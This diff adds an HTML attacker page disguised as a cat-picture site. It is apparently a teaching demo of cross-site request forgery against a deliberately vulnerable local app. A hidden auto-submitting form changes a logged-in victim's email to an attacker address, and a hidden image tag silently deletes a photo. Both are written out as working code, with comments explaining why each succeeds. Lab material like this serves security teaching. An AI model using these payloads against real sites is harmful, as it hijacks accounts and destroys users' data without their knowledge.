@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Totally Legit Cat Pictures</title></head>
+<body>
+<h1>Totally Legit Cat Pictures</h1>
+<p>Nothing suspicious here. Just cats. Definitely not a CSRF demo.</p>
+
+<!--
+  CSRF #1: classic auto-submitting form.
+  VulnerablePhotos parses application/x-www-form-urlencoded bodies (express.urlencoded),
+  and /api/account/email has no anti-CSRF token, so this silently changes the
+  logged-in victim's email the moment this page loads — no click needed.
+-->
+<form id="evil-form" action="http://127.0.0.1:3000/api/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.example">
+</form>
+
+<!--
+  CSRF #2: GET-based delete. Because the app also exposes a GET variant of
+  the delete endpoint (worst-case CSRF: no even form needed), a plain <img>
+  tag is enough. This deletes photo id=1 for whoever is logged in.
+-->
+<img src="http://127.0.0.1:3000/api/photos/1/delete" style="display:none" alt="">
+
+<script>
+  document.getElementById('evil-form').submit();
+</script>
+</body>
+</html>
